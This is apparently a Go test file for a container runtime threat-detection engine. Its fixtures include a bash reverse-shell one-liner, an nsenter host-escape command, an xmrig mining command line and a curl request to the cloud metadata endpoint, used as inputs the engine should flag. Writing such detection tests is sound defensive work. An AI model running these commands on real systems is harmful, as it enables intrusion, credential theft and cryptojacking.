package runtime

import (
	"context"
	"testing"
	"time"
)

func TestDetectionEngine_ProcessEvent(t *testing.T) {
	engine := NewDetectionEngine()

	tests := []struct {
		name           string
		event          *RuntimeEvent
		wantFindings   int
		wantCategories []DetectionCategory
	}{
		{
			name: "crypto mining process",
			event: &RuntimeEvent{
				ID:        "test-1",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "xmrig",
					Cmdline: "xmrig --pool stratum://pool.example.com",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryCryptoMining},
		},
		{
			name: "container escape nsenter",
			event: &RuntimeEvent{
				ID:        "test-2",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "nsenter",
					Cmdline: "nsenter -t 1 -m -u -i -n",
				},
				Container: &ContainerEvent{
					ContainerID: "abc123",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryContainerEscape},
		},
		{
			name: "reverse shell bash",
			event: &RuntimeEvent{
				ID:        "test-3",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "bash",
					Cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryReverseShell},
		},
		{
			name: "imds access",
			event: &RuntimeEvent{
				ID:        "test-4",
				Timestamp: time.Now(),
				EventType: "network",
				Process: &ProcessEvent{
					Name: "curl",
				},
				Network: &NetworkEvent{
					DstIP:   "169.254.169.254",
					DstPort: 80,
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryCredentialAccess},
		},
		{
			name: "legitimate process",
			event: &RuntimeEvent{
				ID:        "test-5",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "nginx",
					Cmdline: "nginx: worker process",
				},
			},
			wantFindings:   0,
			wantCategories: nil,
		},
		{
			name: "container drift new binary",
			event: &RuntimeEvent{
				ID:        "test-6",
				Timestamp: time.Now(),
				EventType: "file",
				File: &FileEvent{
					Operation: "create",
					Path:      "/usr/bin/malware.elf",
				},
				Container: &ContainerEvent{
					ContainerID: "abc123",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryContainerDrift},
		},
		{
			name: "ssh keys modified",
			event: &RuntimeEvent{
				ID:        "test-7",
				Timestamp: time.Now(),
				EventType: "file",
				File: &FileEvent{
					Operation: "modify",
					Path:      "/root/.ssh/authorized_keys",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryPersistence},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := engine.ProcessEvent(context.Background(), tt.event)

			if len(findings) != tt.wantFindings {
				t.Errorf("got %d findings, want %d", len(findings), tt.wantFindings)
			}

			for i, cat := range tt.wantCategories {
				if i < len(findings) && findings[i].Category != cat {
					t.Errorf("finding %d category = %s, want %s", i, findings[i].Category, cat)
				}
			}
		})
	}
}

func TestDetectionEngine_ListRules(t *testing.T) {
	engine := NewDetectionEngine()
	rules := engine.ListRules()

	if len(rules) == 0 {
		t.Error("expected default rules to be loaded")
	}

	// Check for critical rule categories
	categories := make(map[DetectionCategory]bool)
	for _, rule := range rules {
		categories[rule.Category] = true
	}

	requiredCategories := []DetectionCategory{
		CategoryCryptoMining,
		CategoryContainerEscape,
		CategoryReverseShell,
		CategoryLateralMovement,
		CategoryCredentialAccess,
	}

	for _, cat := range requiredCategories {
		if !categories[cat] {
			t.Errorf("missing rules for category: %s", cat)
		}
	}
}

func TestDetectionEngine_Suppression(t *testing.T) {
	engine := NewDetectionEngine()

	// Get a rule ID
	rules := engine.ListRules()
	if len(rules) == 0 {
		t.Skip("no rules loaded")
	}

	ruleID := rules[0].ID

	// Set suppression
	engine.SetSuppression(ruleID, true)

	// Create event that would trigger the rule
	event := &RuntimeEvent{
		ID:        "test-suppressed",
		Timestamp: time.Now(),
		EventType: "process",
		Process: &ProcessEvent{
			Name:    "xmrig",
			Cmdline: "xmrig",
		},
	}

	findings := engine.ProcessEvent(context.Background(), event)

	// Check that findings are marked as suppressed
	for _, f := range findings {
		if f.RuleID == ruleID && !f.Suppressed {
			t.Error("expected finding to be marked as suppressed")
		}
	}
}

func TestDetectionEngineProcessEventPreservesObservationForSparseLegacyEvents(t *testing.T) {
	engine := NewDetectionEngine()
	findings := engine.ProcessEvent(context.Background(), &RuntimeEvent{
		ID:        "legacy-1",
		Timestamp: time.Now(),
		EventType: "process",
		Process: &ProcessEvent{
			Name:    "xmrig",
			Cmdline: "xmrig --pool stratum://pool.example.com",
		},
	})
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1", len(findings))
	}
	if findings[0].Observation == nil {
		t.Fatal("expected finding observation")
	}
	if findings[0].Observation.Process == nil || findings[0].Observation.Process.Name != "xmrig" {
		t.Fatalf("finding observation process = %#v", findings[0].Observation.Process)
	}
}

func TestDetectionEngineProcessNormalizedObservation(t *testing.T) {
	engine := NewDetectionEngine()
	observation, err := NormalizeObservation(&RuntimeObservation{
		ID:         "obs-1",
		Kind:       ObservationKindProcessExec,
		Source:     "tetragon",
		ObservedAt: time.Now(),
		Process: &ProcessEvent{
			Name:    "xmrig",
			Cmdline: "xmrig --pool stratum://pool.example.com",
		},
		Container: &ContainerEvent{
			ContainerID: "ctr-1",
		},
	})
	if err != nil {
		t.Fatalf("NormalizeObservation: %v", err)
	}

	findings := engine.ProcessNormalizedObservation(context.Background(), observation)
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1", len(findings))
	}
	if findings[0].Observation == nil || findings[0].Observation.ID != observation.ID {
		t.Fatalf("finding observation = %#v, want normalized observation id %q", findings[0].Observation, observation.ID)
	}
}

func TestDetectionEngineCandidateRulesForEventSkipsStrictlyRequiredDomains(t *testing.T) {
	engine := &DetectionEngine{
		suppressions:   make(map[string]bool),
		recentFindings: make([]RuntimeFinding, 0),
		maxFindings:    100,
	}
	engine.AddRule(DetectionRule{
		ID:      "process-only",
		Enabled: true,
		Conditions: []Condition{
			{Field: "process.name", Operator: "eq", Value: "bash"},
		},
	})
	engine.AddRule(DetectionRule{
		ID:      "network-only",
		Enabled: true,
		Conditions: []Condition{
			{Field: "network.dst_port", Operator: "eq", Value: "443"},
		},
	})
	engine.AddRule(DetectionRule{
		ID:      "process-and-container",
		Enabled: true,
		Conditions: []Condition{
			{Field: "process.name", Operator: "eq", Value: "bash"},
			{Field: "container.container_id", Operator: "neq", Value: ""},
		},
	})
	engine.AddRule(DetectionRule{
		ID:      "network-and-process-neq",
		Enabled: true,
		Conditions: []Condition{
			{Field: "network.dst_port", Operator: "eq", Value: "22"},
			{Field: "process.name", Operator: "neq", Value: "ssh"},
		},
	})
	engine.AddRule(DetectionRule{
		ID:      "network-and-process-eq",
		Enabled: true,
		Conditions: []Condition{
			{Field: "network.dst_port", Operator: "eq", Value: "22"},
			{Field: "process.name", Operator: "eq", Value: "ssh"},
		},
	})

	candidates := engine.candidateRulesForEvent(&RuntimeEvent{
		ID:        "evt-1",
		Timestamp: time.Now(),
		Network:   &NetworkEvent{DstPort: 22},
	})

	got := make(map[string]bool, len(candidates))
	for _, candidate := range candidates {
		got[candidate.ID] = true
	}

	if !got["network-only"] {
		t.Fatal("expected network-only rule to remain a candidate")
	}
	if !got["network-and-process-neq"] {
		t.Fatal("expected cross-domain neq rule to remain a candidate on partial events")
	}
	if got["process-only"] {
		t.Fatal("did not expect process-only rule for network-only event")
	}
	if got["process-and-container"] {
		t.Fatal("did not expect process-and-container rule for network-only event")
	}
	if got["network-and-process-eq"] {
		t.Fatal("did not expect cross-domain eq rule without process data")
	}
}

func TestDetectionEngineProcessEventKeepsPartialDomainNeqCoverage(t *testing.T) {
	engine := &DetectionEngine{
		suppressions:   make(map[string]bool),
		recentFindings: make([]RuntimeFinding, 0),
		maxFindings:    100,
	}
	engine.AddRule(DetectionRule{
		ID:       "lateral-movement-ssh-unusual",
		Name:     "Unusual SSH Connection",
		Category: CategoryLateralMovement,
		Severity: "medium",
		Enabled:  true,
		Conditions: []Condition{
			{Field: "network.dst_port", Operator: "eq", Value: "22"},
			{Field: "process.name", Operator: "neq", Value: "ssh"},
		},
	})

	findings := engine.ProcessEvent(context.Background(), &RuntimeEvent{
		ID:        "evt-ssh",
		Timestamp: time.Now(),
		Network:   &NetworkEvent{DstPort: 22},
	})

	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1", len(findings))
	}
	if findings[0].RuleID != "lateral-movement-ssh-unusual" {
		t.Fatalf("finding rule id = %q, want lateral-movement-ssh-unusual", findings[0].RuleID)
	}
}

func TestDetectionEngineAddRulePrecompilesRegexConditions(t *testing.T) {
	engine := &DetectionEngine{
		suppressions:   make(map[string]bool),
		recentFindings: make([]RuntimeFinding, 0),
		maxFindings:    100,
	}

	engine.AddRule(DetectionRule{
		ID:      "regex-rule",
		Enabled: true,
		Conditions: []Condition{
			{Field: "process.name", Operator: "regex", Value: "^bash$"},
		},
	})

	if len(engine.rules) != 1 {
		t.Fatalf("len(engine.rules) = %d, want 1", len(engine.rules))
	}
	if engine.rules[0].Conditions[0].compiledRegex == nil {
		t.Fatal("expected regex condition to be compiled during rule registration")
	}
}

func BenchmarkDetectionEngineProcessNormalizedObservationProcessOnly(b *testing.B) {
	engine := NewDetectionEngine()
	observation, err := NormalizeObservation(&RuntimeObservation{
		ID:         "bench-process",
		Kind:       ObservationKindProcessExec,
		Source:     "tetragon",
		ObservedAt: time.Now(),
		Process: &ProcessEvent{
			Name:    "nginx",
			Cmdline: "nginx: worker process",
		},
	})
	if err != nil {
		b.Fatalf("NormalizeObservation: %v", err)
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.ProcessNormalizedObservation(context.Background(), observation)
	}
}

func BenchmarkDetectionEngineProcessNormalizedObservationFileOnly(b *testing.B) {
	engine := NewDetectionEngine()
	observation, err := NormalizeObservation(&RuntimeObservation{
		ID:         "bench-file",
		Kind:       ObservationKindFileWrite,
		Source:     "tetragon",
		ObservedAt: time.Now(),
		File: &FileEvent{
			Operation: "modify",
			Path:      "/tmp/app.log",
		},
	})
	if err != nil {
		b.Fatalf("NormalizeObservation: %v", err)
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.ProcessNormalizedObservation(context.Background(), observation)
	}
}
